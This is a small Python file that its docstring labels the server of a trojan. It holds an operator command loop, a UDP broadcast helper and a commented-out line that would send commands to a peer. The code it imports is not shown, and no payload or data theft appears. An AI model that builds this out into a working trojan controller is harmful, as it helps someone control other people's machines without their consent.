"""Server of a Trojan."""

from Server.servers import SERVERS, close_all_servers, close_server_by_name
from Server.config import ciphers, PORT, FORMAT, logger
from Server.exceptions import AccessDenied, CloseServer
from Server.helper_functions import dont_accept_keyboard_interrupt, timeout

from tqdm import trange


def broadcast(msg: str) -> None:
    """Broadcast to all"""

    SERVERS["broadcast"].sendto(msg, ('<broadcast>', PORT)) # broadcast on specified port


@dont_accept_keyboard_interrupt
def cmd_input() -> None:
    while not ciphers.get((cmd := input("> ").lower()), lambda: False)():
        print(cmd)
        # SERVERS["p2p"].sendto(bytes(cmd, FORMAT), (addr, port))

    assert close_all_servers(), "Something went wrong when closing the servers"


@dont_accept_keyboard_interrupt
def main() -> bool:
    try:
        cmd_input()
    except CloseServer:
        logger.info(" [ADMIN] Closed server")
        return False
    except AccessDenied as e:
        logger.warning(f" [PRIVILAGE] TIMEOUT BECAUSE: {e}")
        [timeout() for _ in trange(10)] # wait 10 seconds
    return True

if __name__ == '__main__':
    while True:
        x = main()
        print(x)
        if x == False:
            break
